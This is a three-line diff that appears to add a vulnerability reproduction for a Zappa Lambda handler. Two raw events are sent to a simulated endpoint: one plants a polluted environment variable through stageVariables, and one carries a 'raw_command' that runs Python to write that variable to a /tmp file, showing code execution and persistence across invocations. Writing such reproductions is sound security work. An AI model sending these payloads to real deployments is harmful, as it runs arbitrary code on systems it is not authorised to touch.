@@ -1,0 +1,3 @@
+# Two separate direct-invoke events (proves cross-invocation persistence)
+POST /_sim/raw-event   {"stageVariables":{"ZAPPA_POLLUTED_<rand>":"set-by-invocation-1-<rand>"}}
+POST /_sim/raw-event   {"raw_command":"import os; open(\"/tmp/vuln008_<rand>\",\"w\").write(os.environ.get(\"ZAPPA_POLLUTED_<rand>\",\"<absent>\"))"}
